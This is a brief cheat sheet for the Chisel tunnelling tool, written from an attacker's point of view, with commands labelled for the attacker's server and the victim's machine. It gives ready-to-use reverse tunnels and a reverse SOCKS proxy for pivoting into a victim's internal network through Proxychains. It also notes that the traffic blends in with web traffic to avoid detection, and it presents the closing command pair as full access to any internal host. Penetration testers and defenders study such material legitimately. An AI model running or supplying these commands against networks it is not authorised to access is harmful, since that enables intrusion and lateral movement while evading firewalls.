---
title: Chisel Command List
date: 2026-01-05
category: commands
enrich: false
tags: chisel, cybersecurity, command reference, network
description: Top 10 essential commands for chisel.
---

# Chisel Command Guide

**Chisel** is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. It is the modern alternative to SSH tunneling because it's a single binary and works over HTTP (firewall friendly).

## Top 10 Useful Commands

### 1. Server Mode (Attacker)
```bash
chisel server -p 8000 --reverse
```
**Explanation:** Listen on 8000, allow reverse tunnels (`--reverse`).

### 2. Client Mode (Victim) - Reverse Proxy
```bash
chisel client 10.10.10.10:8000 R:80:127.0.0.1:80
```
**Explanation:** "Make my local port 80 appear on the server's port 80". Exposes an internal service to the attacker.

### 3. SOCKS5 Proxy (The Magic Command)
```bash
chisel client 10.10.10.10:8000 R:socks
```
**Explanation:** Connect to server and open a SOCKS proxy on the server. Attacker can now use Proxychains to browse the Victim's network.

### 4. Port Forwarding (Local)
```bash
chisel client 10.10.10.10:8000 9000:google.com:80
```
**Explanation:** Forward local 9000 to remote google:80 via the tunnel.

### 5. Authentication
```bash
chisel server --auth "user:pass"
```
**Explanation:** Require password for tunnels.

### 6. Keepalive
```bash
chisel client ... --keepalive 10s
```
**Explanation:** Send ping to keep connection open.

### 7. Verbose
```bash
chisel server -v
```
**Explanation:** Debug logs.

### 8. Fingerprint Hide
```bash
# (Chisel uses websockets/http, looks like web traffic)
```

### 9. Forward UDP
```bash
chisel client ... 53:1.1.1.1:53/udp
```
**Explanation:** Support UDP tunneling.

### 10. Help
```bash
chisel --help
```

## The Most Powerful Command
**Server (Attacker):** `chisel server -p 8000 --reverse`
**Client (Victim):** `chisel client 10.10.10.10:8000 R:socks`
**Explanation:** This single pair of commands gives you a full VPN-like capability to access ANY internal IP address of the victim network using Proxychains.

